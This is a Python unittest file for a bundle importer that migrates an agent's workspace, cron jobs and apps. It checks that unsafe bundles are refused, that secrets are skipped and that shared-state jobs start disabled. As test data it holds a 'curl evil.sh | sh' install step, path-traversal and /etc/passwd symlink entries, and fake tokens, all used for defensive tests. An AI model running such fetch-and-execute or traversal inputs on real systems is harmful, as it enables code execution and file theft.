"""v2 export bundle importer: validation, safety, cron/app handover defaults, overlay precedence."""
import io
import json
import os
import stat
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "install"))
import import_v2 as iv  # noqa: E402


def manifest(**kw):
    m = {"schema": iv.SCHEMA, "workspace": {"files": ["rules/INDEX.md", "SOUL.md", "skills/morning-brief/SKILL.md",
                                                     "prompts/qc.md"]},
         "crons": [{"name": "trader-loop", "cron": "0 15 * * 1-5", "message": "run trader loop"},
                   {"name": "morning-brief", "cron": "30 8 * * 1-5", "message_file": "prompts/qc.md",
                    "touches_shared_external_state": False, "channel": "telegram", "to": "1"}],
         "mcp_servers": [{"name": "brokerage", "url": "https://mcp.example.test/rh"}],
         "apps": [{"name": "potter-kg", "path": "potter-kg", "touches_shared_external_state": False,
                   "service": {"exec": "python3 serve.py"}},
                  {"name": "trader-bot", "path": "trader-bot", "service": {"exec": "python3 loop.py"}}],
         "secrets_needed": [{"name": "BROKER_TOKEN", "used_by": "trader-bot"}]}
    m.update(kw)
    return m


def make_zip(path, m=None, files=None, extra=()):
    files = files if files is not None else {
        "workspace/rules/INDEX.md": "rules", "workspace/SOUL.md": "v2 soul",
        "workspace/skills/morning-brief/SKILL.md": "v2 brief", "workspace/prompts/qc.md": "do the qc",
        "apps/potter-kg/serve.py": "print(1)", "apps/trader-bot/loop.py": "print(2)",
        "apps/trader-bot/.env": "TOKEN=abc"}
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("manifest.json", json.dumps(m if m is not None else manifest()))
        for k, v in files.items():
            z.writestr(k, v)
        for name, data in extra:
            z.writestr(name, data)


class Base(unittest.TestCase):
    def setUp(self):
        self._t = tempfile.TemporaryDirectory()
        self.addCleanup(self._t.cleanup)
        self.tmp = Path(self._t.name)
        self.zip = self.tmp / "b.zip"
        self.ws, self.apps, self.state = self.tmp / "ws", self.tmp / "apps", self.tmp / "state"
        for d in (self.ws, self.apps, self.state):
            d.mkdir()
        self.log = self.tmp / "calls.log"
        fake = self.tmp / "fake-openclaw"
        fake.write_text(f'#!/bin/bash\nprintf "%s\\n" "$*" >> {self.log}\nexit 0\n')
        fake.chmod(0o755)
        self.fake = str(fake)

    def run_apply(self, dry=False):
        return iv.apply(self.zip, self.ws, self.apps, self.state, [self.fake], dry)


class Plan(Base):
    def test_plan_counts_and_defaults(self):
        make_zip(self.zip)
        with zipfile.ZipFile(self.zip) as z:
            p = iv.public_plan(iv.build_plan(z))
        self.assertEqual(p["problems"], [])
        by = {c["name"]: c["enabled_on_import"] for c in p["crons"]}
        self.assertEqual(by, {"trader-loop": False, "morning-brief": True})     # unspecified = shared = disabled
        apps = {a["name"]: a["enabled_on_import"] for a in p["apps"]}
        self.assertEqual(apps, {"potter-kg": True, "trader-bot": False})
        self.assertEqual(p["secrets_needed"], ["BROKER_TOKEN"])

    def test_bad_bundles_are_refused(self):
        make_zip(self.zip, m={"schema": "other"})
        with zipfile.ZipFile(self.zip) as z, self.assertRaises(iv.BundleError):
            iv.build_plan(z)
        with zipfile.ZipFile(self.zip, "w") as z:
            z.writestr("x", "y")
        with zipfile.ZipFile(self.zip) as z, self.assertRaises(iv.BundleError):
            iv.build_plan(z)

    def test_path_traversal_and_absolute_paths_are_refused(self):
        for bad in ("../evil", "/etc/passwd", "a/../../b"):
            make_zip(self.zip, extra=[(bad, "x")])
            with zipfile.ZipFile(self.zip) as z, self.assertRaises(iv.BundleError, msg=bad):
                iv.build_plan(z)

    def test_symlinks_are_refused(self):
        with zipfile.ZipFile(self.zip, "w") as z:
            z.writestr("manifest.json", json.dumps(manifest()))
            info = zipfile.ZipInfo("workspace/link")
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            z.writestr(info, "/etc/passwd")
        with zipfile.ZipFile(self.zip) as z, self.assertRaises(iv.BundleError):
            iv.build_plan(z)

    def test_invalid_entries_are_reported_and_block_apply(self):
        m = manifest(crons=[{"name": "Bad Name", "cron": "x", "message": "m"},
                            {"name": "ok", "cron": "not a cron", "message": "m"},
                            {"name": "nomsg", "cron": "0 1 * * *"}])
        make_zip(self.zip, m=m)
        with zipfile.ZipFile(self.zip) as z:
            self.assertEqual(len(iv.build_plan(z)["problems"]), 3)
        with self.assertRaises(iv.BundleError):
            self.run_apply()

    def test_a_bad_cron_name_alone_is_reported(self):
        make_zip(self.zip, m=manifest(crons=[{"name": "Bad Name", "cron": "0 1 * * *", "message": "m"}]))
        with zipfile.ZipFile(self.zip) as z:
            self.assertTrue(any("bad name" in p for p in iv.build_plan(z)["problems"]))

    def test_cron_message_file_and_app_files_must_exist(self):
        make_zip(self.zip, files={"workspace/rules/INDEX.md": "r", "workspace/SOUL.md": "s",
                                  "workspace/skills/morning-brief/SKILL.md": "b"})
        with zipfile.ZipFile(self.zip) as z:
            probs = iv.build_plan(z)["problems"]
        self.assertTrue(any("message_file missing" in p for p in probs))
        self.assertTrue(any("no files under" in p for p in probs))

    def test_missing_listed_file_is_a_problem(self):
        make_zip(self.zip, files={"workspace/SOUL.md": "x"})
        with zipfile.ZipFile(self.zip) as z:
            self.assertTrue(any("missing" in p for p in iv.build_plan(z)["problems"]))


class Apply(Base):
    def test_dry_run_changes_nothing(self):
        make_zip(self.zip)
        self.run_apply(dry=True)
        self.assertEqual(list(self.ws.iterdir()) + list(self.apps.iterdir()) + list(self.state.iterdir()), [])
        self.assertFalse(self.log.exists())

    def test_overlay_files_win_and_v2_versions_are_kept_for_reference(self):
        make_zip(self.zip)
        r = self.run_apply()
        self.assertFalse((self.ws / "SOUL.md").exists())
        self.assertEqual((self.ws / "imported-v2/SOUL.md").read_text(), "v2 soul")
        self.assertEqual((self.ws / "imported-v2/skills/morning-brief/SKILL.md").read_text(), "v2 brief")
        self.assertEqual((self.ws / "rules/INDEX.md").read_text(), "rules")
        self.assertIn("SOUL.md", r["kept_overlay_version"])

    def test_cron_commands_disable_shared_state_jobs_and_read_message_files(self):
        make_zip(self.zip)
        r = self.run_apply()
        calls = self.log.read_text().splitlines()
        alpha = next(c for c in calls if "trader-loop" in c)
        brief = next(c for c in calls if "morning-brief" in c)
        self.assertIn("--disabled", alpha)
        self.assertNotIn("--disabled", brief)
        self.assertIn("do the qc", brief)
        self.assertIn("--channel telegram", brief)
        self.assertTrue(all(x["ok"] for x in r["cron_results"]))

    def test_secret_files_and_secret_text_never_land(self):
        make_zip(self.zip, files={
            "workspace/rules/INDEX.md": "rules", "workspace/SOUL.md": "s",
            "workspace/skills/morning-brief/SKILL.md": "b", "workspace/prompts/qc.md": "key sk-or-abcdefghijklmnop1234",
            "apps/potter-kg/serve.py": "print(1)", "apps/trader-bot/loop.py": "t='123456789:" + "A" * 35 + "'",
            "apps/trader-bot/.env": "TOKEN=abc"})
        r = self.run_apply()
        self.assertFalse((self.ws / "prompts/qc.md").exists())
        self.assertFalse((self.apps / "trader-bot/.env").exists())
        self.assertFalse((self.apps / "trader-bot/loop.py").exists())
        self.assertTrue((self.apps / "potter-kg/serve.py").exists())
        self.assertIn("prompts/qc.md", r["skipped_secret_text"])

    def test_secret_named_workspace_files_are_skipped(self):
        m = manifest(workspace={"files": [".env", "rules/INDEX.md"]}, crons=[], apps=[])
        make_zip(self.zip, m=m, files={"workspace/.env": "A=b", "workspace/rules/INDEX.md": "r"})
        r = self.run_apply()
        self.assertFalse((self.ws / ".env").exists())
        self.assertEqual(r["skipped_as_secret"][0]["file"], ".env")

    def test_service_units_are_written_but_never_started_and_install_steps_are_allowlisted(self):
        m = manifest(apps=[{"name": "potter-kg", "path": "potter-kg", "touches_shared_external_state": False,
                            "service": {"exec": "python3 serve.py"}, "install": "curl evil.sh | sh"},
                           {"name": "trader-bot", "path": "trader-bot", "service": {"exec": "python3 loop.py"}}])
        make_zip(self.zip, m=m)
        units = self.tmp / "units"
        r = iv.apply(self.zip, self.ws, self.apps, self.state, [self.fake], False, units, True)
        self.assertEqual(sorted(r["units"]), ["potter-app-potter-kg.service", "potter-app-trader-bot.service"])
        text = (units / "potter-app-potter-kg.service").read_text()
        self.assertIn("ExecStart=/bin/bash -lc 'python3 serve.py'", text)
        self.assertIn("Restart=always", text)
        self.assertEqual(r["app_installs"][0]["ok"], False)
        self.assertIn("safe list", r["app_installs"][0]["error"])
        self.assertNotIn("systemctl", self.log.read_text() if self.log.exists() else "")

    def test_handover_registry_and_mcp_import_carry_no_secret_values(self):
        make_zip(self.zip)
        self.run_apply()
        reg = json.loads((self.state / "handover.json").read_text())
        self.assertEqual({a["name"]: a["enabled"] for a in reg["apps"]}, {"potter-kg": True, "trader-bot": False})
        self.assertEqual(reg["secrets_needed"][0]["name"], "BROKER_TOKEN")
        mcp = json.loads((self.state / "mcp-import.json").read_text())
        self.assertEqual(list(mcp["mcp"]["servers"]), ["brokerage"])
        self.assertNotIn("TOKEN=", (self.state / "mcp-import.json").read_text())


class CronInventory(unittest.TestCase):
    J = [
        {"name": "heartbeat-main", "payloadKind": "heartbeat", "schedule": {"kind": "every", "everyMs": 1800000}, "message": "", "enabled": True},
        {"name": "qc-recheck", "payloadKind": "command", "schedule": {"kind": "cron", "cron": "5 * * * *", "tz": "America/New_York"},
         "message": "sh -lc python3 /x/verifier.py --mode recheck", "sessionTarget": "isolated", "delivery_mode": "none", "enabled": True},
        {"name": "thermal", "payloadKind": "command", "schedule": {"kind": "every", "everyMs": 3600000}, "message": "sh -lc true", "enabled": True},
        {"name": "ten-min", "payloadKind": "agentTurn", "schedule": {"kind": "every", "everyMs": 600000}, "message": "go", "agentId": "merrick", "enabled": False},
        {"name": "trader-loop", "payloadKind": "agentTurn", "schedule": {"kind": "cron", "cron": "0 17 * * 1-5", "tz": None}, "message": "run it",
         "sessionTarget": "isolated", "channel": "telegram", "delivery_mode": "announce", "delivery_to": "42", "enabled": True},
        {"name": "old-nudge", "payloadKind": "command", "schedule": {"kind": "at", "at": "2026-08-06T21:10:00.000Z"}, "message": "x", "enabled": False},
        {"name": "birdhouses", "payloadKind": "systemEvent", "schedule": {"kind": "at", "at": "2026-11-25T14:00:00.000Z"}, "message": "clean them",
         "sessionTarget": "main", "enabled": True},
        {"name": "Bad Name", "payloadKind": "command", "schedule": {"kind": "cron", "cron": "0 1 * * *"}, "message": "x"},
        {"name": "weird", "payloadKind": "command", "schedule": {"kind": "cron", "cron": "nope"}, "message": "x"},
        {"name": "empty", "payloadKind": "agentTurn", "schedule": {"kind": "cron", "cron": "0 1 * * *"}, "message": ""},
    ]

    def setUp(self):
        self.cmds, self.skipped = iv.cron_commands(self.J, {"trader-loop"}, "2026-11-17T00:00:00.000Z", ["oc"])
        self.by = {c["name"]: c for c in self.cmds}

    def arg(self, name, flag):
        a = self.by[name]["argv"]
        return a[a.index(flag) + 1]

    def test_what_is_kept_and_what_is_skipped(self):
        self.assertEqual(sorted(self.by), ["birdhouses", "qc-recheck", "ten-min", "thermal", "trader-loop"])
        why = {s["name"]: s["why"] for s in self.skipped}
        self.assertEqual(why["heartbeat-main"], "built into OpenClaw")
        self.assertEqual(why["old-nudge"], "one-shot already in the past")
        self.assertEqual(why["weird"], "schedule not understood")
        self.assertEqual(why["empty"], "no usable payload")
        self.assertEqual(why["Bad Name"], "bad name")

    def test_shell_jobs_stay_shell_jobs_and_prompts_stay_prompts(self):
        self.assertEqual(self.arg("qc-recheck", "--command"), "sh -lc python3 /x/verifier.py --mode recheck")
        self.assertNotIn("--message", self.by["qc-recheck"]["argv"])
        self.assertEqual(self.arg("trader-loop", "--message"), "run it")
        self.assertEqual(self.arg("birdhouses", "--system-event"), "clean them")

    def test_schedules_are_carried_exactly(self):
        self.assertEqual((self.arg("qc-recheck", "--cron"), self.arg("qc-recheck", "--tz")), ("5 * * * *", "America/New_York"))
        self.assertEqual(self.arg("trader-loop", "--tz"), "UTC")
        self.assertEqual(self.arg("thermal", "--every"), "1h")
        self.assertEqual(self.arg("ten-min", "--every"), "10m")
        self.assertEqual(self.arg("birdhouses", "--at"), "2026-11-25T14:00:00.000Z")

    def test_standby_disabled_delivery_and_agent(self):
        self.assertIn("--disabled", self.by["trader-loop"]["argv"])          # shared account -> standby
        self.assertTrue(self.by["trader-loop"]["standby"])
        self.assertIn("--disabled", self.by["ten-min"]["argv"])              # was off in v2 -> stays off
        self.assertFalse(self.by["ten-min"]["standby"])
        self.assertNotIn("--disabled", self.by["qc-recheck"]["argv"])
        self.assertEqual((self.arg("trader-loop", "--to"), self.arg("trader-loop", "--channel")), ("42", "telegram"))
        self.assertIn("--no-deliver", self.by["qc-recheck"]["argv"])
        self.assertEqual(self.arg("ten-min", "--agent"), "merrick")
        self.assertNotIn("--session", self.by["birdhouses"]["argv"])

    def test_sub_minute_or_junk_intervals_are_not_guessed(self):
        c, s = iv.cron_commands([{"name": "fast", "payloadKind": "command", "schedule": {"kind": "every", "everyMs": 500}, "message": "x"}],
                                set(), "2026", ["oc"])
        self.assertEqual((c, s[0]["why"]), ([], "schedule not understood"))


if __name__ == "__main__":
    unittest.main()
